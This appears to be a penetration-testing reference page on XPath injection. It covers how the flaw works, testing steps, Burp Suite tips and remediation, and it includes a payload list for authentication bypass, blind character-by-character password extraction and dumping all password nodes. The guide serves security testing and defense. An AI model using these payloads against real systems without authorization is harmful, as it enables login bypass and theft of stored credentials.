# XPath Injection

## Overview
XPath injection occurs when user-supplied input is embedded unsanitized into an XPath query used to navigate and retrieve data from an XML document or database (e.g., LDAP directories, XML-based config stores, native XML databases like eXist-db). Attackers can modify the XPath expression to bypass authentication, extract sensitive data, or enumerate the entire XML tree.

## How It Works
- The application constructs an XPath query by concatenating user input: `//users/user[name/text()='<input>' and password/text()='<input>']`.
- By injecting XPath operators (`' or '1'='1`, `'] | //users/*[1='1`), the attacker alters query logic.
- Unlike SQL injection, XPath has no comment syntax in standard XPath 1.0, but string manipulation techniques work similarly.
- Blind XPath injection is possible using boolean-based inference (`substring()`, `string-length()`).

## Impact
- Authentication bypass (login without valid credentials).
- Full extraction of the XML data store (usernames, passwords, secrets).
- Enumeration of the document structure and all nodes.
- Bypassing access controls that are XML-backed.

## Where to Look
- Login forms backed by XML user stores.
- Search functionality that queries XML data sources.
- Applications using XML for config, storage, or user management.
- SOAP web services (SOAP bodies are XML).
- Any field that appears to query structured data that isn't SQL.

## Testing Steps
1. Identify input fields that might be used in XPath queries (login, search, config lookup).
2. Test with a single quote `'` — observe if an error or different response occurs.
3. Try `' or '1'='1` as username with any password — if authentication is bypassed, XPath injection is confirmed.
4. For search: try `' or 1=1 or 'a'='a` to return all results.
5. For blind injection: use `' and substring(//user[1]/password/text(),1,1)='a` and vary the character to extract data.
6. Enumerate with `count(//user)` to learn the number of users.
7. Attempt to read the root document: `/* | //* | /bookstore/book[position()=1]`.

## Payloads / Techniques
```xpath
# Authentication bypass (username field)
' or '1'='1
admin' or '1'='1
' or 1=1 or 'a'='b
x' or name()='username' or 'x'='y

# Close the query and inject
'] | //* | ['a'='a
' or position()=1 or 'a'='b

# Blind: extract first char of first user password
' and substring(//user[1]/password/text(),1,1)='a
' and substring(//user[1]/password/text(),1,1)='b

# Enumerate users count
' and count(//user)=3 and 'a'='a

# Extract usernames (boolean blind)
' and substring(//user[1]/name/text(),1,1)='a
' and string-length(//user[1]/name/text())=5

# Dump all passwords
')] | //password | ['
```

## Burp Suite Tips
- In **Repeater**, manually inject XPath payloads into authentication and search parameters.
- Use **Intruder** to brute-force each character position in blind extraction.
- Observe response length/content differences as the oracle for blind injection.
- **Burp Scanner** (Pro) may flag XPath injection in active scans.

## Tools
- Burp Suite Intruder (for blind extraction)
- XCAT — https://github.com/orf/xcat (automated XPath injection exploitation)
- Manual Python scripts for blind extraction via boolean responses

## Remediation
- Use parameterized XPath queries (not string concatenation): use your language's XPath variable binding mechanism.
- Java: `XPathExpression` with `setXPathVariableResolver`.
- .NET: Use LINQ to XML instead of raw XPath string building.
- Whitelist-validate input before including in XPath expressions.
- Avoid exposing XPath error messages to the user — use generic error responses.

## References
https://owasp.org/www-community/attacks/XPATH_Injection
https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection
